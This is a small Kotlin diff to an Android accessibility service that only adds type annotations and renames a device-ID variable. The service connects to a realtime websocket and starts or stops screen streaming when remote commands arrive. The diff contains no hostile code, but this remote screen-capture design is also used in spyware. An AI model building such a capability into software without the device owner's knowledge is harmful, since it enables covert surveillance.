@@ -47,9 +47,9 @@ class NexusAccessibilityService : AccessibilityService() {
     override fun onInterrupt() {}
 
     private fun ligarRealtime() {
-        val url = supaUrl
-        val key = supaKey
-        val id: String = deviceId
+        val url: String = supaUrl
+        val key: String = supaKey
+        val did: String = NexusAccessibilityService.deviceId
         if (url.isEmpty()) {
             handler.postDelayed({ ligarRealtime() }, 2000L)
             return
@@ -57,7 +57,7 @@ class NexusAccessibilityService : AccessibilityService() {
         wsClient = RealtimeWsClient(
             supaUrl  = url,
             supaKey  = key,
-            deviceId = id,
+            deviceId = did,
             onPedirTela = { iniciarStream() },
             onPararTela  = { pararStream() }
         )
